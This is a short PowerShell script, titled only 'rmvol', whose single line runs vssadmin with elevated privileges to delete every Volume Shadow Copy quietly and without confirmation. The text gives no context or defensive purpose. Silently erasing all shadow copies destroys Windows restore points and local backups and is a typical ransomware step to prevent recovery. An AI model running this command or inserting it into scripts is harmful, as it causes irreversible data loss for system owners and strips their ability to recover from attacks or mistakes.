<#
.SYNOPSIS
    rmvol
#>
Start-Process -FilePath "vssadmin" -ArgumentList "delete", "shadows", "/all", "/quiet" -Verb RunAs -Wait
